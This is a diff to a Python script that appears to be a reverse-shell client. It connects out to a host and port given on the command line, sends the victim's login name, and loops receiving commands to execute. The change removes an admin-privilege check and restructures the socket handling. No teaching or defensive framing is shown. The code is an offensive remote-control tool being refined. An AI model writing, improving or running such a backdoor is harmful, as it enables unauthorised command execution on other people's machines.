@@ -1,7 +1,6 @@
 import socket
 import subprocess
 import os
-from ctypes import *
 import sys
 
 
@@ -9,7 +8,6 @@ def session_handler(sock, target_ip, target_port):
     print(f'[+] Connecting to {target_ip}.')
     sock.connect((target_ip, target_port))
     outbound(sock, os.getlogin())
-    outbound(sock, windll.shell32.IsUserAnAdmin)
     print(f'[+] Connected to {target_ip}.')
     while True:
         message = inbound(sock)
@@ -49,13 +47,11 @@ def execute_command(sock, message):
 
 def inbound(sock):
     print('[+] Awaiting response...')
-    message = ''
-    while True:
-        try:
-            message = sock.recv(1024).decode()
-            return message
-        except Exception:
-            sock.close()
+    try:
+        message = sock.recv(1024).decode()
+        return message
+    except Exception:
+        sock.close()
 
 
 def outbound(sock, message):
@@ -64,14 +60,16 @@ def outbound(sock, message):
 
 
 def main():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         target_ip = sys.argv[1]
         target_port = int(sys.argv[2])
-        session_handler(sock, target_ip, target_port)
     except IndexError:
         print('[-] Command line argument(s) missing.  Please try again.')
         return
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        session_handler(sock, target_ip, target_port)
     except Exception as e:
         print(e)
 
